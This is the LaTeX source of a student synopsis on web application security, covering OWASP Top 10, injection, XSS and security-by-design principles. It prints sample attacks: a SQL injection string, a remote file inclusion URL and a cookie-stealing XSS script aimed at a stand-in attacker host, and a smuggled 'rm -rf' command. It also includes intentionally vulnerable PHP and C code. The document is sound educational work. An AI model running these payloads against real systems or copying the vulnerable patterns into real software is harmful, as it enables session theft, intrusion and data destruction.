\documentclass[a4paper]{article}

\usepackage[utf8]{inputenc}
\usepackage{booktabs}
\usepackage{minted}

\setcounter{tocdepth}{2}

\title{Application Security}
\author{Marcin Zelent}
\date{May 2018}

\begin{document}

\maketitle

\newpage

\tableofcontents

\newpage

\section{Introduction}

One of the mandatory activities in Computer Science course at Erhvervsakademi
Sjælland is an individual specialization project. In this project, a student has
to choose a subject, which was not presented during the lectures, research it
and describe it in a synopsis.

I have chosen application security as the topic that I want to learn more about.
Application security is an umbrella term for all of the measures that need to be
taken in order to make a secure application. That means finding, fixing and
preventing security vulnerabilities.

I decided to work on this subject, because in previous semesters we have learned
how to make programs, services, and web applications, but we did not learn how
to make them safe from exploitation. It is important since a potential attacker
could use it to gain access to the system without authorization, retrieve some
sensitive data, abuse or even break the system. This could lead to some serious
consequences.

\section{Problem definition}

During my research, I am going to delve deeper into the subject of application
security, its meaning, principles, importance in the modern software
development, as well as practical implementation.
The main question which I would like to answer is:

\medskip
{\large How to make a secure application?} 
\medskip

In order to give an answer to it, I will first need to find solutions to the
following problems:

\begin{itemize}
	\item What is application security?
	\item What are the most common application security flaws and attack
		techniques?
	\item How can software developers prevent them?
\end{itemize}

\newpage

\section{Method}

The method which I am going to use in my research consists of a few activities:

\begin{itemize}
	\item Getting general information about application security using all
		of the sources available on the internet, this could include
		reading articles, watching videos, talks, lectures and online
		courses.
	\item Reading books related to the subject of application security.
	\item Finding detailed descriptions and tutorials about specific attack
		techniques.
	\item Trying to reproduce the attacks by creating vulnerable
		applications, exploiting them and trying to make them secure.
\end{itemize}

\section{Plan}

To optimize my work and to make sure I will deliver the finished synopsis
before the deadline, I have prepared a plan which I will try to follow:

\begin{table}[h]
	\centering
	\begin{tabular}{@{}lll@{}}
		\toprule
		Week 18              & Week 19 \& 20            & Week 21
		\\ \midrule
		Writing introduction & Doing an actual research & Writing
		conclusion        \\
		Defining the problem & Describing the work      & Reflecting on
		the work    \\
		Choosing the method  & Preparing examples       & Putting
		finishing touches \\
		Planning             &                          &
		\\ \bottomrule
	\end{tabular}
	\caption{Week plan}
	\label{my-label}
\end{table}

The first week is a project initialization phase, in which I will describe what
I am going to do in the next weeks, how and why.

In the second and third week, I will focus on learning, finding information and
describing the results of it. I am also going to work on the practical part of
this project, which is learning how to use different attack techniques and
creating examples for the presentation of them.

In the last week, I will look back at my work, write a summary of it, as well as
my reflections on the research process. I will also proofread my synopsis and
correct any mistakes that I find.

\newpage

\section{Work}

\subsection{What is application security?}

Application security describes activities that need to be taken into
consideration by a developer who creates an application which will be available
to a broader group of users. Having a large user base means that there is a risk
that, among the regular users, there might be some individuals with malicious
intents.

These people, usually called attackers, could try to access sensitive data
stored in the database connected to the application or use functions that
normally are only available for the users with special privileges. Such data
could include for example a list of users, some important documents or money in
a bank account. Administrator actions, like adding/removing users or changing
application's settings could be an example of functionality wanted by the
attackers.

In order to achieve their goals, the attackers try to find vulnerabilities,
unintended flaws or weaknesses in the application, and exploit them. Although
the application security improved over the years, some of the most common
vulnerabilities remain unchanged and include: broken authentication, broken
access controls, SQL injection, cross-site scripting (XSS), information leakage
and cross-site request forgery (CSRF).

When talking about application security, it usually means web application
security. The reason for this is the fact that web apps are nowadays the most
common form of application. Every day billions of people are searching for
information using Google, browsing Facebook and watching videos on YouTube. All
of these are web applications. What makes them different from regular websites
is that they do not just display static content, but allow users to interact
with them. Users can, for example, sign up, log in, write comments, upload
videos. A lot of sensitive data is flowing between the user and the system.
This, and being publicly available, makes them frequent targets of the
attackers.

Other common targets are mobile and desktop applications, with the emphasis on
the first one. Just like web apps they are usually part of a bigger system and
process private data. Moreover, their security is often neglected by the
developers in favor of having more features. That could make them security
holes, easy gateways leading to the precious resources. 

\newpage

\subsection{Why is application security important?}

There should be no doubt about the importance of application security. There are
many reasons for that.

First and most important is the risk of unwanted disclosure of sensitive data to
the attackers, if the application becomes compromised. This could include names,
addresses, login credentials, credit card information, bank account details,
private photos and many more information about the users of the system. By
breaking into the unprotected system, attackers could also gain access to
company's internal data: important documents, list of employees, private keys,
and passwords. All this information could be useful for them in various ways.
For example, it could be used to buy things or perform financial operations
without the knowledge of the account owner. The data could be sold on the black
market or published on the internet. It could be used to harass or blackmail the
unfortunate users. Attackers could also impersonate them and cause even more
problems. It could be especially dangerous when pretending to be a corporate
worker as their actions could harm the entire business. Stealing blueprints,
prototypes or early versions of unreleased products could bring massive
losses of money and force changes of plans.

Another issue is the possibility of gaining access to functionality reserved
only for privileged users, such as moderators and administrators. It could allow
not only for data theft but also for damaging the system and stored
information. It would allow for spreading viruses and malware throughout the
whole platform, creating a botnet, spambots, mining cryptocurrencies and making
it vulnerable to further attacks. It would be sufficient just to insert
malicious code into the application and infest its users.

Other, non-technical risks include the possible loss of trust from customers,
who value privacy and wish their data to be secure. It could even lead to
lawsuits like it happened to Yahoo which got sued over security breaches that 
took place between 2013 and 2016. Private information of at least 3 billion 
users was exposed, it included names, e-mail addresses, dates of birth,
phone numbers, passwords, etc. It cost the company hundreds of millions of
dollars and damaged the brand image permanently. On the other hand, providing
good security could help in gaining new clients.

In the wake of mobile and Internet of Things applications, security should be
the top priority for application developers. IoT creates many new risks that
were never seen before. Since all of the devices are connected to the internet,
they can be accessed by the attackers. It is a big threat to the privacy of
their users because they can be used to spy on them 24/7 by utilizing the
built-in camera, microphone or reading device activity, and logs. This
information could be used to blackmail the victims or even help in a burglary.
By knowing the victim's daily routine, the criminal could try to break into the
house when its owner is out. Moreover, he could exploit the "smart home"
security system, since usually it is also connected to the network. Finally,
the attacker could use the functionality of the compromised IoT devices in a
bad way, for example making them use a lot of power, causing a short circuit or
even starting a fire.

\newpage

\subsection{Most common application security vulnerabilities}

There are many possible weaknesses but some of them occur more often than the
rest. A non-profit organization called Open Web Application Security Project
(or just OWASP for short), which mission is to make software more secure,
publishes a compilation of these vulnerabilities every 3 years in a document
titled \textit{OWASP Top 10 - The Ten Most Critical Web Application Security
Risks}. It is a result of the work of OWASP, over 40 security companies and
over 500 individuals. It lists the most common weakness, describes each of them
in details, with examples and ways of prevention. It also contains further
pieces of advice for developers, security testers, organizations and
application managers.

The latest release of OWASP Top 10 lists these vulnerabilities as the most
critical web application security risks:

\begin{itemize}
	\item \textbf{A1:2017 - Injection} \\
		Allows the attacker to execute malicious code in the
		application's back-end by tricking the interpreter with a
		specially crafted message, e.g. SQL injection.
	\item \textbf{A2:2017 - Broken Authentication} \\
		Includes every weakness which would enable the attacker to get
		into to the application without authentication, i.e. by 
		hijacking other user's session, guessing or brute-forcing
		password, getting keys or bypassing the login completely.
	\item \textbf{A3:2017 - Sensitive Data Exposure} \\
		Exposing sensitive data because of weak protection, lack of
		encryption, defective error handling or other behavior.
	\item \textbf{A4:2017 - XML External Entities (XXE)} \\
		Exploitation of older or poorly configured XML processors, which
		could disclose specific files on the server by parsing an
		external entity included in the XML message sent by the
		attacker.
	\item \textbf{A5:2017 - Broken Access Control} \\
		Allows the attacker to use functionality available only to
		privileged users without authorization or to access other users'
		accounts and sensitive data.
	\item \textbf{A6:2017 - Security Misconfiguration} \\
		The insecure configuration of some components of the system, for
		example by using default config files or enabling debugging
		options, which give detailed error messages with information
		useful to the attackers. This includes also neglect of patching
		and updating the components.
	\item \textbf{A7:2017 - Cross-Site Scripting (XSS)} \\
		Focuses on attacking users of the application by making their
		browser execute code which was previously uploaded to the
		app. Could allow to hijack the victim's session or redirect it
		to a malicious website. 
	\item \textbf{A8:2017 - Insecure Deserialization} \\
		Flaws in deserialization algorithms allowing remote code
		execution, replay attacks, injection attacks and privilege
		escalation attacks.
	\item \textbf{A9:2017 - Using Components with Known Vulnerabilities} \\
		A weakness in one component could lead to a compromise of the
		whole system. An application is just as secure as its weakest
		link.
	\item \textbf{A10:2017 - Insufficient Logging \& Monitoring} \\
		An application needs to log what is happening inside it and its
		status needs to be monitored so, in case of a breach,
		the administrators could detect it, find a cause of it and fix
		the weakness.
\end{itemize}

Apart from these risks, there are also some additional weaknesses that need to
be taken into consideration when creating an application:

\begin{itemize}
	\item CWE-352: Cross-Site Request Forgery (CSRF)
	\item CWE-400: Uncontrolled Resource Consumption ("Resource Exhaustion,
		"AppDoS")
	\item CWE-434: Unrestricted Upload of File with Dangerous Type
	\item CWE-451: User Interface (UI) Misinterpretation of Critical
		Information (Clickjacking and others)
	\item CWE-601: Unvalidated Forwards and Redirects
	\item CWE-799: Improper Control of Interaction Frequency
		(Anti-Automation)
	\item CWE-829: Inclusion of Functionality from Untrusted Control Sphere
		(3rd Party Content)
	\item CWE-918: Server-Side Request Forgery (SSRF)
\end{itemize}

Let's take a closer look at some of the listed vulnerabilities now.

\subsection{Injection}

\subsubsection{How it works}

When an application is not protected against this exploitation, it is possible
to insert a malicious code into the input field, which could be a part of a
login page or some form. Nothing bad could happen if a user types in it normal,
expected text, like \texttt{johnsmith@mail.com}. But if an attacker puts there
a specially crafted message like \texttt{login' OR '1'='1}, he could be able to
login to the system without a password.

The way it works is simple. In this case, it is a SQL injection attack. When a
user presses the login button, the contents of the input fields are sent to the
back-end, which is executing a SQL query to find a user with specified username
and later to validate the password. This is how the first part of this query
could look like:

\begin{minted}{sql}
SELECT * FROM Users WHERE Username = '$USERNAME';
\end{minted}

The \texttt{\$USERNAME} in this query is replaced with the inserted data. In
expected scenario:

\begin{minted}{sql}
SELECT * FROM Users WHERE Username = 'johnsmith@mail.com';
\end{minted}

The application will look for \texttt{johnsmith@mail.com}. However, in the
attack scenario the query would look like this:

\begin{minted}{sql}
SELECT * FROM Users WHERE Username = 'login' OR '1'='1';
\end{minted}

In this case, the original query is changed by the attacker. \texttt{OR
'1'='1'} added by the attacker is a statement, which is always true. Therefore,
the database ignores the first condition (\texttt{WHERE Username = 'login'}),
which is false because there is no user with a username \texttt{login} and
returns all users. The application expects only one user to be returned, so it
will only take the first one and log in the attacker as this user.

Apart from SQL injection, there are many more injection attack techniques. Here
is an example of remote file injection made in PHP:

\begin{minted}{php}
<?php
   if ( isset( $_GET['car'] ) ) {
         include( $_GET['car'] . '.php' );
    }
?>
\end{minted}

The intended behavior is to load a PHP file, which is on the server, when
loading an URL like: \texttt{https://example.com/cars.php?car=lamborghini}.
This should load the lamborghini.php file. However, it could be exploited to
load a remote file with malicious code just by changing the end of the URL,
from \texttt{lamborghini} to \texttt{https://attackerswebsite.com/badcode}.

Another injection attack is command injection. In this attack, the attacker can
execute shell commands by passing them to an application, which does not do
input validation. Here is a C code, which is vulnerable to this technique:

\begin{minted}{c}
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv)
{
	char cmd[strlen(argv[1]) + 6];
	strcpy(cmd, "echo ");
	strcat(cmd, argv[1]);
	system(cmd);
        
	return 0;
 }
\end{minted}

It is just a simple wrapper around echo command, which prints whatever text
passed as an argument. The output of \texttt{Hello!} would be \texttt{Hello!}.
But passing \texttt{Hello!; rm -rf --no-preserve-root /} will not only print
\texttt{Hello!}, but also wipe the system partition completely, if run with 
superuser privileges.

\subsubsection{How to prevent it}

To avoid injection attacks or at least minimize their consequences, it is
important to validate any input that is provided by the user or could be sent to
the application in other ways. There are many approaches to this.

One way is to blacklist possibly malicious keywords, such as \texttt{OR '1'='1}
or \texttt{rm -rf --no-preserve-root /}, but this approach is far from ideal.
The first problem is that it is impossible to block every troublesome
combination, there are just too many of them. Changing \texttt{OR '1'='1} to
\texttt{OR 'x'='x} or putting comments inside the query could easily bypass
this filter.

Whitelisting is probably a better technique. Instead of blocking some keywords,
it is allowing only specific characters or combinations. For example, it could
accept only letters from a to z and digits from 0 to 9. In case there are some
other characters, the message will be blocked. It is a very good approach, but
it has some drawbacks. If a form requires a user to put his last name, but it
contains an apostrophe (e.g. O'Malley) or a special letter with an accent (e.g.
Polański), he will not be able to put it there.

Sanitization is another, highly effective approach. It works by removing
malicious parts from the input or replacing them with safe alternatives. Let's
say an attacker injects a dangerous script, like
\texttt{"><script>alert("foo")</script>}. The sanitization algorithm could make
it safe by stripping \texttt{<script>} tags and removing quotation marks.

Finally, the best method to ensure the processed data is safe could be using
API intended for that, which does not use an interpreter or utilizes a
parameterized interface. An example of that would be sending prepared statements
with parameterized queries to prevent SQL injections just like in the C\# code
below:

\begin{minted}{csharp}
string username = "johnsmith";
string query = "SELECT * FROM Users WHERE Username=@param_username";
SqlCommand cmd = new SqlCommand(query);
cmd.Parameters.AddWithValue("@param_username, username);
\end{minted}

This way, if an attacker sends \texttt{login' OR '1'='1} to the application,
it will not cause any harm, because the query would simply try to find a user
with name \texttt{login' OR '1'='1}.

\subsection{Cross-Site Scripting (XSS)}

\subsubsection{How it works}

Cross-Site Scripting is closely related to injection as it works by inserting a
malicious code to the application. There are two categories of this attack:
stored and reflected. 

The first one occurs when injected code is stored permanently on the server. An
example could be a comment on a forum, which contains Javascript code. If the
vulnerability is present, it will not be displayed on the page, but it will be
executed. It could be simple like:

\begin{minted}{js}
<script>document.createElement('img').src = 'http://attackerswebsite.com/' +
document.cookie</script>
\end{minted}

This script would create an HTTP request to attacker's website with the victim's
cookies, which could contain for example very useful session token. It is also
possible to include much bigger scripts with:

\begin{minted}{js}
<script src="http://attackerswebsite.com/evilscript.js"></script>
\end{minted}

The reflected attack works by reflecting the injected code off the trusted
website.  For example, an attacker might send an URL with malicious code to the
victim, e.g:
\texttt{http://website.com/<script\%20src="http://attackerswebsite.com/
evilscript.js"></script>}. The URL itself is not dangerous, but the vulnerable
website might show an error message containing the URL, thus embedding it and
executing the injected script.

\subsubsection{How to prevent it}

To prevent XSS a few methods could be used. Some special characters like
\texttt{<}, \texttt{>} could be URL encoded, in this case into \texttt{\%3C} and
\texttt{\%3E}. This way all input will be displayed, but the script will not be
executed. Another way would be to completely prohibit usage of
\texttt{<script>}, \texttt{<link>} or \texttt{<iframe>} tags in HTML-enabled
forms.

\subsection{Security by design}

It is a good practice to create applications with security in mind from the very
beginning of the development. It helps to avoid having vulnerabilities in the
future. This idea known as security by design is based on several security
principles:

\begin{itemize}
	\item \textbf{Minimize attack surface area}
		The more features an application has, the higher the risk of it
		being vulnerable to exploits because the attack surface area is
		bigger. It is encouraged to add only necessary functions and
		make them simple.
	\item \textbf{Establish secure defaults}
		It means making security measures on by default, but allowing to
		disable them, if a user wishes to.
	\item \textbf{Principle of Least privilege}
		Every entity in the application should have just as many
		privileges and resources as they need to perform their actions
		and no more than that.
	\item \textbf{Principle of Defense in depth}
		The defense should be created by layered security mechanisms, so
		if one of them becomes broken, the other ones may still prevent
		the attack.
	\item \textbf{Fail securely}
		If a security mechanism fails and throws exceptions, it should
		still serve its purpose and block the request that caused the
		error.
	\item \textbf{Don't trust services}
		When an application is using the third party services, it
		should be careful just like with any other external system.
		These services could have different, perhaps worse security and
		might get compromised. Trusting them too much creates a risk
		for the app.
	\item \textbf{Separation of duties}
		Every user of the application has his role (e.g. administrator,
		client) and capabilities. An account with one role should not
		have the functionality of another role.
	\item \textbf{Avoid security by obscurity}
		Application's security should not rely on keeping secrets, like
		being closed source or using custom cipher algorithm. It should
		be also using other security mechanisms.
	\item \textbf{Keep security simple}
		Simple code is more secure and faster than a complex one, as it
		minimizes the attack surface area.
	\item \textbf{Fix security issues correctly}
		When a security bug is found, it is important to understand how
		it is working, analyze it and test. All other components
		affected by this issue should be also checked to make sure they
		are safe.
\end{itemize}

Microsoft created software development process which follows these principles,
Security Development Lifecycle (SDL). It consists of 16 practices, split into 6
phases. These activities include: security training, setting requirements and
minimal levels of security, risks assessment, designing secure functionality and
security functions, safe implementation, analysis, testing of the produced
application, creating emergency plan and final review.

\newpage

\section{Conclusion}

To conclude, to make a secure application it is important to understand the
concept and importance of application security, to know the possible
vulnerabilities and design the app in a way which would prevent them. There are
many exploits, but most of them are well-known since they are present for many
years. To each one of them, there are possible countermeasures. Some of them are
better than the others depending on the situation, requirements, environment.
They have their benefits, but they could also have drawbacks sometimes. It is up
to the developer to choose the right one, implement it properly and thoroughly
test. However, he is not alone in this process. There are many resources and
guides available with good practices, security principles, attack techniques and
prevention methods made by people dedicated to making software more secure.

\section{Reflection}

Thanks to this project I have learned a lot about application security and how
to make my apps secure. I got really interested in this subject and I would
like to continue studying it. That is why I believe it was a good decision to
pick up this topic. The questions I asked in my problem definition were on
point as, by trying to answer them, I managed to describe the things I wanted
to learn and write about. I think my methods of research were correct since the
availability of resources made it easy to find information in many different,
interesting forms. Creation of examples allowed me to not only understand the
security concepts in theory but also in practice. The plan I came up with was
good because it allowed me to focus on my goals instead of single activities on
specific days, which would be hard to follow, because of my dynamic schedule.
Although looking back at it, I could make it better by assigning less time on
initial and final activities and putting more time on the actual work. This
made me not follow my plan completely the way I would like to. However, in the
end, I managed to finish my synopsis on time, so it is not a big issue.

\newpage

\begin{thebibliography}{9}

	\addcontentsline{toc}{section}{References}

	\bibitem{webapphandbook}
		Dafydd Stuttard, Marcus Pinto.
		\textit{The Web Application Hacker's Handbook: Finding and
		Exploiting Security Flaws, 2nd Edition}.
		John Wiley \& Sons Inc, ISBN: 978-1118026472, 2011.

	\bibitem{owasptop10}
		The OWASP Foundation
		\textit{OWASP Top 10 - 2017 (The Ten Most Critical Web
		Application Security Risk)}
		\texttt{https://www.owasp.org/images/7/72/
		OWASP\_Top\_10-2017\_(en).pdf.pdf}

	\bibitem{lyndaowasptop10}
		Caroline Wong.
		\textit{Learning the OWASP Top 10}.
		\texttt{https://lynda.com/IT-\allowbreak{}
		Infrastructure-tutorials/Learning-OWASP-Top-10/642483-2.html}
		
	\bibitem{cernertalk}
		Michael Coates.
		\textit{Application Security - Understanding, Exploiting and
		Defending against Top Web Vulnerabilities}.
		\texttt{https://youtu.be/sY7pUJU8a7U}

	\bibitem{mobappsec}
		Sarah Vonnegut.
		\textit{Mobile Application Security: 15 Best Practices for App
		Developers}
		\texttt{https://checkmarx.com/2015/08/19/mobile-application}

	\bibitem{sbd}
		OWASP.
		\textit{Security by Design Principles}.
		\texttt{https://www.owasp.org/index.php/\allowbreak{}
		Security\_by\_Design\_Principles}

	\bibitem{sdl}
		Microsoft.
		\textit{Security Development Lifecycle}.
		\texttt{https://www.microsoft.com/sdl}

\end{thebibliography}

\end{document}
